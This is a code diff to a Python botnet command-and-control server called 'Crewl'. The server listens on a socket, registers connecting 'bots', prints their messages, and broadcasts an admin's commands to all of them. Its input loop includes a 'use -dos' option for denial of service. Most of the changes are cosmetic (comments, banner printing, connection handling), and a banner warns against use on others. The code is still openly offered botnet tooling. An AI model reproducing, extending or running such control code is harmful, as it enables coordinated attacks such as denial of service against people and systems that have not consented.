@@ -10,6 +10,7 @@ server_socket.bind(("192.168.1.182", 2121))
 server_socket.listen(10)
 
 
+# colors
 class color:
     END = '\33[0m'
     BOLD = '\33[1m'
@@ -56,64 +57,53 @@ class color:
     WHITEBG2 = '\33[107m'
 
 
+# function which runs when crewl is starting
 def sysstart():
-    banner = f"""
-    ▄████▄   ██▀███  ▓█████  █     █░ ██▓    
-    ▒██▀ ▀█  ▓██ ▒ ██▒▓█   ▀ ▓█░ █ ░█░▓██▒    
-    ▒▓█    ▄ ▓██ ░▄█ ▒▒███   ▒█░ █ ░█ ▒██░    
-    ▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓█  ▄ ░█░ █ ░█ ▒██░    
-    ▒ ▓███▀ ░░██▓ ▒██▒░▒████▒░░██▒██▓ ░██████▒
-    ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░░ ▒░ ░░ ▓░▒ ▒  ░ ▒░▓  ░
-      ░  ▒     ░▒ ░ ▒░ ░ ░  ░  ▒ ░ ░  ░ ░ ▒  ░
-    ░          ░░   ░    ░     ░   ░    ░ ░   
-    ░ ░         ░        ░  ░    ░        ░  ░
-    ░                                         
-    """
+    os.system("clear")
 
-    infobox = f"""
-    ----------------------------------------
-    |      ● Crewl by Tilman Steck ●      |
-    |                                      |
-    | version > 1.0                        |
-    | donate > https://paypal.com/acc/     |
-    |                                      |
-    | IMPORTANT: Do not use this against   |
-    | other people, just on yourself!      |
-    |                                      |
-    | Admin User > 'King Crewl'            |
-    | bots > 'crewler'                     |
-    |                                      |
-    ----------------------------------------
-    """
+    print(color.YELLOW2 + "▄████▄   ██▀███  ▓█████  █     █░ ██▓")
+    print(color.YELLOW2 + "▒██▀ ▀█  ▓██ ▒ ██▒▓█   ▀ ▓█░ █ ░█░▓██▒")
+    print(color.YELLOW2 + "▒▓█    ▄ ▓██ ░▄█ ▒▒███   ▒█░ █ ░█ ▒██░ ")
+    print(color.YELLOW2 + "▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓█  ▄ ░█░ █ ░█ ▒██░")
+    print(color.YELLOW2 + "▒ ▓███▀ ░░██▓ ▒██▒░▒████▒░░██▒██▓ ░██████▒")
+    print(color.YELLOW2 + "░ ░▒ ▒  ░░ ▒▓ ░▒▓░░░ ▒░ ░░ ▓░▒ ▒  ░ ▒░▓  ░")
+    print(color.YELLOW2 + "  ░  ▒     ░▒ ░ ▒░ ░ ░  ░  ▒ ░ ░  ░ ░ ▒  ░")
+    print(color.YELLOW2 + "░          ░░   ░    ░     ░   ░    ░ ░   ")
+    print(color.YELLOW2 + "░ ░         ░        ░  ░    ░        ░  ░")
+    print(color.YELLOW2 + "░ ")
+    print("")
+    print("")
+    print("")
 
-    print(color.YELLOW2 + banner)
-    print(color.BLUE2 + infobox)
-    print("\n[*] Crewl ist starting... \n")
+    print(color.YELLOW2 + "----------------------------------------")
+    print(color.YELLOW2 + "|      ● Crewl by Tilman Steck ●      |")
+    print(color.YELLOW2 + "|                                      |")
+    print(color.YELLOW2 + "| version > 1.0                        |")
+    print(color.YELLOW2 + "| donate > https://paypal.com/acc/     |")
+    print(color.YELLOW2 + "|                                      |")
+    print(color.YELLOW2 + "| IMPORTANT: Do not use this against   |")
+    print(color.YELLOW2 + "| other people, just on yourself!      |")
+    print(color.YELLOW2 + "|                                      |")
+    print(color.YELLOW2 + "| Admin User > 'King Crewl'            |")
+    print(color.YELLOW2 + "| bots > 'crewler'                     |")
+    print(color.YELLOW2 + "|                                      |")
+    print(color.YELLOW2 + "----------------------------------------")
 
+    print(color.YELLOW + "\n[*] Crewl ist starting... \n")
 
-    # setup toolbar
-    toolbar_width = 30
-
-    sys.stdout.write(color.BOLD + "[%s]" % (" " * toolbar_width))
-    sys.stdout.flush()
-    sys.stdout.write("\b" * (toolbar_width + 1))  # return to start of line, after '['
-
-    for i in range(toolbar_width):
-        time.sleep(0.2)
-        sys.stdout.write("▬")
-        sys.stdout.flush()
-
-    sys.stdout.write(color.BOLD + "]\n\n" + color.END)
-
-    time.sleep(2)
+    time.sleep(1)
 
 
+# this function runs always in threads for receiving data from the bots
 def recieve(conn, adress):
     while True:
         if len(botNet) > 0:
             try:
                 inmessage = conn.recv(1024).decode()
-                print(color.VIOLET2 + "\n'" + inmessage + "' from '" + str(adress) + "'")
+                if inmessage == "":
+                    break
+                else:
+                    print(color.VIOLET2 + "\n'" + inmessage + "' from '" + str(adress) + "'")
 
                 continue
 
@@ -123,13 +113,14 @@ def recieve(conn, adress):
                 break
 
             except KeyboardInterrupt:
-                sys.exit()
+                os._exit(1)
 
         elif len(botNet) == 0:
             print(color.RED2 + "[*] There aren't any bots online. System is stopping now!" + color.END)
             sys.exit()
 
 
+# this function runs whren a new bot is connecting
 def connect():
     while True:
 
@@ -144,6 +135,7 @@ def connect():
         continue
 
 
+# when admin user enters a command
 def botnetcommand(command):
     for client in botNet:
         try:
@@ -154,6 +146,7 @@ def botnetcommand(command):
             remove(client)
 
 
+# when a bot is going offline he has to removed from the botlist
 def remove(conn):
     if conn in botNet:
         botNet.remove(conn)
@@ -174,7 +167,7 @@ while True:
     try:
         header = f"""\n{color.YELLOW2}{os.getlogin()}@crewl$ """
 
-        cmdinput = input(header)
+        cmdinput = input(header + color.GREEN2)
 
         if len(botNet) > 0:
             if cmdinput == "use" or cmdinput == "use -dos":
@@ -197,9 +190,3 @@ while True:
     except KeyboardInterrupt:
         print(color.RED2 + "[*] Keyboard Interrupt! Stopping system" + color.END)
         os._exit(1)
-
-
-# socket connect/deconnect ohne error
-# mehr befehle
-# bot optimieren
-# \n einfügen
